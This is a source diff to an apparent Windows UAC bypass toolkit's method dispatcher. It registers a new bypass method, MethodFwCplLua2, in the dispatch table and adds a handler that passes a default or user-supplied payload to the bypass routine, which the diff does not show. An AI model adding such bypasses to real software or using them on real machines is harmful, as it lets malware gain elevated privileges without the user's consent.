@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.52
+*  VERSION:     3.53
 *
-*  DATE:        28 Oct 2020
+*  DATE:        07 Nov 2020
 *
 *  UAC bypass dispatch.
 *
@@ -42,6 +42,7 @@ UCM_API(MethodNICPoison);
 UCM_API(MethodDeprecated);
 UCM_API(MethodIeAddOnInstall);
 UCM_API(MethodWscActionProtocol);
+UCM_API(MethodFwCplLua2);
 
 #define UCM_WIN32_NOT_IMPLEMENTED_COUNT 5
 ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
@@ -118,7 +119,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodMsSettings, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua2, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
 /*
@@ -652,4 +654,21 @@ UCM_API(MethodWscActionProtocol)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmWscActionProtocolMethod(lpszPayload);
+}
+
+UCM_API(MethodFwCplLua2)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Parameter);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmFwCplLuaMethod2(lpszPayload);
 }
